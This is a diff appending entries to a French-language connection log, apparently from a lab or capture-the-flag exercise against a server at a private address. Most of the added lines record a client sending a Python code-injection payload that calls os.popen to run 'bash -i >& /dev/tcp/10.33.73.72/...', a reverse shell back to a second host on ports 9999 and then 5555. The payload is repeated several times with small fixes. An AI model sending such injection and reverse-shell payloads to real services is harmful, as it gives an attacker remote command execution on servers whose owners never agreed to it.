@@ -4,3 +4,18 @@
 2024-10-24 11:43:00 INFO Connexion réussie à 10.33.66.78:13337
 2024-10-24 11:44:11 INFO Connexion réussie à 10.33.66.78:13337
 2024-10-24 11:46:04 INFO Connexion réussie à 10.33.66.78:13337
+2024-10-25 10:02:31 INFO Connexion réussie à 10.33.66.78:13339
+2024-10-25 10:02:31 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-25 10:02:31 INFO Message envoyé au serveur 10.33.66.78 : import('os').popen('bash -i >& /dev/tcp/10.33.73.72/9999 0>&1').read()
+2024-10-25 10:02:31 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-25 10:03:12 INFO Connexion réussie à 10.33.66.78:13339
+2024-10-25 10:03:12 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-25 10:03:12 INFO Message envoyé au serveur 10.33.66.78 : import('os').popen('bash -i >& /dev/tcp/10.33.73.72/9999 0>&1').read()
+2024-10-25 10:03:12 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-25 10:14:48 INFO Connexion réussie à 10.33.66.78:13339
+2024-10-25 10:15:41 INFO Connexion réussie à 10.33.66.78:13339
+2024-10-25 10:15:41 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-25 10:15:41 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('bash -i >& /dev/tcp/10.33.73.72/5555 0>&1').read()
+2024-10-25 10:23:30 INFO Connexion réussie à 10.33.66.78:13339
+2024-10-25 10:23:30 INFO Réponse reçue du serveur 10.33.66.78 : b'Hello'
+2024-10-25 10:23:30 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('bash -i >& /dev/tcp/10.33.73.72/5555 0>&1').read()
